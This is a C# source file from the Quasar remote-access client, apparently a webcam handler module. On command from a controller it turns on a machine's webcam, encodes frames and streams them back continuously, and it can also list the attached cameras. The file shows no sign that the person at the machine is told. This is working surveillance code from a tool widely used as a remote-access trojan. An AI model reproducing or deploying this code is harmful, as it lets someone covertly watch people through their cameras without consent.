﻿using Quasar.Client.Helper;
using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Common.Video;
using Quasar.Common.Video.Codecs;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using System.Threading;
using System.Diagnostics;
using Quasar.Common.Messages.Webcam;

namespace Quasar.Client.Messages
{
    public class RemoteWebcamHandler : NotificationMessageProcessor, IDisposable
    {
        private UnsafeStreamCodec _streamCodec;
        private BitmapData _webcamData = null;
        private Bitmap _webcam = null;
        private ISender _clientMain;
        private Thread _sendFramesThread;
        private readonly WebcamHelper _webcamHelper = new WebcamHelper();

        private readonly Stopwatch _stopwatch = new Stopwatch();
        private int _frameCount = 0;

        public override bool CanExecute(IMessage message) => message is GetWebcam ||
                                                             message is GetAvailableWebcams;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetWebcam msg:
                    Execute(sender, msg);
                    break;
                case GetAvailableWebcams msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetWebcam message)
        {
            if (message.Status == RemoteWebcamStatus.Stop)
            {
                StopWebcamStreaming();
            }
            else if (message.Status == RemoteWebcamStatus.Start)
            {
                StartScreenStreaming(client, message);
            }
        }

        private void StartScreenStreaming(ISender client, GetWebcam message)
        {
            _webcamHelper.StartWebcam(message.DisplayIndex);
            Console.WriteLine("Starting remote webcam session");

            var webcamBounds = _webcamHelper.GetBounds();
            var resolution = new Resolution { Height = webcamBounds.Height, Width = webcamBounds.Width };

            if (_streamCodec == null)
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);

            if (message.CreateNew)
            {
                _streamCodec?.Dispose();
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
                OnReport("Remote webcam session started");
            }

            if (_streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
            {
                _streamCodec?.Dispose();
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
            }

            _clientMain = client;

            if (_sendFramesThread == null || !_sendFramesThread.IsAlive)
            {
                _sendFramesThread = new Thread(() =>
                {
                    _stopwatch.Start();
                    while (true)
                    {
                        CaptureWebcam();
                    }
                });
                _sendFramesThread.Start();
            }
        }


        private void StopWebcamStreaming()
        {
            _webcamHelper.StopWebcam();
            Console.WriteLine("Stopping remote webcam session");

            if (_sendFramesThread != null && _sendFramesThread.IsAlive)
            {
                _sendFramesThread.Abort();
                _sendFramesThread = null;
            }

            if (_webcam != null)
            {
                if (_webcamData != null)
                {
                    try
                    {
                        _webcam.UnlockBits(_webcamData);
                    }
                    catch
                    {
                    }
                    _webcamData = null;
                }
                _webcam.Dispose();
                _webcam = null;
            }

            if (_streamCodec != null)
            {
                _streamCodec.Dispose();
                _streamCodec = null;
            }
        }

        private void CaptureWebcam()
        {
            _webcam = _webcamHelper.GetLatestFrame();

            if (_webcam == null)
                return;

            _webcamData = _webcam.LockBits(new Rectangle(0, 0, _webcam.Width, _webcam.Height),
                ImageLockMode.ReadWrite, _webcam.PixelFormat);

            using (MemoryStream stream = new MemoryStream())
            {
                if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
                _streamCodec.CodeImage(_webcamData.Scan0,
                    new Rectangle(0, 0, _webcam.Width, _webcam.Height),
                    new Size(_webcam.Width, _webcam.Height),
                    _webcam.PixelFormat, stream);
                _clientMain.Send(new GetWebcamResponse
                {
                    Image = stream.ToArray(),
                    Quality = _streamCodec.ImageQuality,
                    Monitor = _streamCodec.Monitor,
                    Resolution = _streamCodec.Resolution
                });
            }

            _frameCount++;
            if (_stopwatch.ElapsedMilliseconds >= 1000)
            {
                Console.WriteLine($"FPS: {_frameCount}");
                _frameCount = 0;
                _stopwatch.Restart();
            }
        }

        private void Execute(ISender client, GetAvailableWebcams message)
        {
            // TODO: Change this to use the WebcamHelper class
            client.Send(new GetAvailableWebcamsResponse { Webcams = _webcamHelper.GetWebcams() });
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                StopWebcamStreaming();
                _streamCodec?.Dispose();
            }
        }
    }
}
